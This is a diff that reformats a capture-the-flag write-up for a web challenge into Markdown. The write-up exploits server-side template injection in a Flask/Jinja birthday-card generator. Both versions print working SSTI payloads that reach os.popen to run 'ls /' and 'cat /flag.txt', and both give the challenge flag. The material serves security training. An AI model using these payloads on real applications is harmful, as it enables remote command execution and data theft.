@@ -1,35 +1,47 @@
-Challenge: Happy Birthday Card Generator
-Points: 100
-Category: Web
+# Happy Birthday Card Generator Challenge
 
-![Alt text](screenshots/happybirthday1.png)
+**Points:** 100  
+**Category:** Web  
 
-![Alt text](screenshots/happybirthday2.png)
+## Task Overview
 
-First, let's try to see how it works. I enter "MD" as input and it gives the following result.
+Explore the functionality of a web-based Happy Birthday Card Generator and identify potential security vulnerabilities.
 
-![Alt text](screenshots/happybirthday3.png)
+![Initial Interface](screenshots/happybirthday1.png)
 
-Let's try to find out which server is it deployed on.
+### Initial Exploration
 
-![Alt text](screenshots/happybirthday4.png)
+1. **Testing Input:**  
+   First, I entered "MD" as input to see how the generator works and it gave the following result.  
+   ![Generator Interface](screenshots/happybirthday2.png)
+   ![Result of Input](screenshots/happybirthday3.png)
 
-As it's Werkzeug/1.0.1 Python/2.7.14, we can try Server-Side Template Injection (SSTI).
-We input {{5*5}} and get 25 in the output.
+### Server Analysis
 
-![Alt text](screenshots/happybirthday5.png) 
+2. **Server Identification:**  
+   Let's try to find out which server it is deployed on.  
+   ![Server Identification](screenshots/happybirthday4.png)
 
-As we have confirmation that SSTI is successful, we can try more sophisticated payloads.
+   As it's Werkzeug/1.0.1 Python/2.7.14, we can try Server-Side Template Injection (SSTI).
 
-Let's try to run "ls" to list files and directories using the following payload:
-{{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls /").read()}} [Payload Credits: https://secure-cookie.io/attacks/ssti/#tldr---show-me-the-fun-part]
+### Exploiting Server-Side Template Injection (SSTI)
 
-![Alt text](screenshots/happybirthday6.png)
+3. **Initial SSTI Test:**  
+   We input `{{5*5}}` and got 25 in the output, confirming that SSTI is successful.  
+   ![SSTI Test](screenshots/happybirthday5.png)
 
-We can see that flag.txt exists and we can get it's contents by using the following payload:
-{{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("cat /flag.txt").read()}} 
+4. **Executing Commands:**  
+   Let's try to run "ls" to list files and directories using the following payload:  
+   `{{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls /").read()}}` [Payload Credits: https://secure-cookie.io/attacks/ssti/#tldr---show-me-the-fun-part]  
+   ![Running 'ls' Command](screenshots/happybirthday6.png)
 
-![Alt text](screenshots/happybirthday7.png)
+   We can see that flag.txt exists.
 
-FLAG: WHETSTONE{SsT1_is_v3ry_6Ad}
+5. **Accessing Flag:**  
+   We can get its contents by using the following payload:  
+   `{{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("cat /flag.txt").read()}}`  
+   ![Reading Flag.txt](screenshots/happybirthday7.png)
 
+## Flag
+
+`WHETSTONE{SsT1_is_v3ry_6Ad}`
